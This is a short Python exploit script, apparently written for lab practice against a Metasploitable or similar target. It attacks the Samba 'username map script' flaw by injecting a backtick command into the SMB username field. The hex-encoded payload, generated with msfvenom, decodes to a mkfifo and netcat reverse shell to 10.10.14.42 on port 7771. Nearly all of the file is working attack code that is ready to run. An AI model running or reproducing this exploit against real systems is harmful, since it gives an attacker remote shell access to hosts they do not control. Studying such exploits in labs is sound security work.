# -*- coding: utf-8 -*-
#!/usr/bin/env python
# WildfootW
# Clone from https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851
# Just a python version of a very simple Samba exploit.
# Based off this Metasploit module - https://www.exploit-db.com/exploits/16320/

import sys
from smb.SMBConnection import SMBConnection
from smb import smb_structs
smb_structs.SUPPORT_SMB2 = False

if len(sys.argv) < 2:
    print("\nUsage: " + sys.argv[0] + " <RHOST>\n")
    sys.exit()

# Shellcode:
# msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.42 LPORT=7771 -f python
buf =  b""
buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x7a"
buf += b"\x69\x68\x6a\x3b\x20\x6e\x63\x20\x31\x30\x2e\x31\x30"
buf += b"\x2e\x31\x34\x2e\x34\x32\x20\x37\x37\x37\x31\x20\x30"
buf += b"\x3c\x2f\x74\x6d\x70\x2f\x7a\x69\x68\x6a\x20\x7c\x20"
buf += b"\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74\x6d\x70"
buf += b"\x2f\x7a\x69\x68\x6a\x20\x32\x3e\x26\x31\x3b\x20\x72"
buf += b"\x6d\x20\x2f\x74\x6d\x70\x2f\x7a\x69\x68\x6a"

username = b"/=`nohup " + buf + b"`"
password = b""

# SMBConnection(username, password, my_name, remote_name, domain='', use_ntlm_v2=True, sign_options=2, is_direct_tcp=False)
# username: str
# password: str
# my_name: str
# remote_name: str
conn = SMBConnection(username.decode(), password.decode(), "SOMEBODYHACKINGYOU" , "METASPLOITABLE", use_ntlm_v2 = False)
assert conn.connect(str.encode(sys.argv[1]), 445)
